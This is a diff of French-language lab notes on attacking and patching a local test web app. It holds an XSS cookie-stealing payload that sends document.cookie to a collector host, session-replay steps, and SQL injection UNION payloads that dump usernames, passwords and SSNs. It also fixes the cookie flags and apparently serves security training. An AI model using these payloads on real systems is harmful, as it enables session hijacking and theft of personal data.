@@ -10,6 +10,15 @@ dans http://localhost:5000/search
 fetch('http://localhost:5001/steal?c=' + document.cookie, { mode: 'no-cors' })
 </script>
 
+Puis dans un onglet de nav privé 
+document.cookie = "session=VOTRE_COOKIE_VOLE; path=/";
+location.reload();
+
+essayer d'accéder à la page http://localhost:5000/admin pour valider le vol de ession
+
+se déconnecter : 
+fetch('/logout').then(() => location.reload())
+
 visualiser le résultat dans le terminal attaquant ou dans http://localhost:5001/dashboard
 [!] COOKIE VOLÉ (2025-06-29 21:04:21):
 127.0.0.1 - - [29/Jun/2025 21:04:21] "GET /steal?c= HTTP/1.1" 404 -
@@ -23,13 +32,13 @@ https://localhost:5000/admin
 SQLi
 
 Déterminer le nombre de colonnes 
-' ORDER BY 9-- 
+' ORDER BY 10-- 
 
 identify version SQL
-' UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9--
+' UNION SELECT 1,sqlite_version(),3,4,5,6,7,8,9,10--
 
 list tables 
-' UNION SELECT 1,group_concat(tbl_name),3,4,5,6,7,8,9 FROM sqlite_master--
+' UNION SELECT 1,group_concat(tbl_name),3,4,5,6,7,8,9,10 FROM sqlite_master--
 
 Données sensibles 
 ' UNION SELECT id,username,password,role,full_name,email,phone,birthdate,ssn FROM user--
@@ -63,9 +72,9 @@ results = db.session.execute(stmt, {'search': f'%{search}%'})
 
 #dans app.py
 app.config.update(
-    SESSION_COOKIE_HTTPONLY=false,
-    SESSION_COOKIE_SECURE=false,
-    REMEMBER_COOKIE_HTTPONLY=false
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SECURE=True,
+    REMEMBER_COOKIE_HTTPONLY=True
 )
 
 #Code vulnérabkle dans app.py
